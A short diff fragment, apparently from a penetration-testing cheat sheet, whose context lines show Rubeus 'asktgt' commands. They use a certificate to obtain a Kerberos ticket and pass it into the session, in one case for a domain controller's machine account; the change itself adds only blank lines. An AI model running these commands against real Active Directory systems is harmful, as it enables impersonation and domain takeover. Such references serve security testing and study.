@@ -17,3 +17,5 @@ updated_at: '2023-04-10T20:26:16.822815+00:00'
 Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
 Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
 ```
+
+
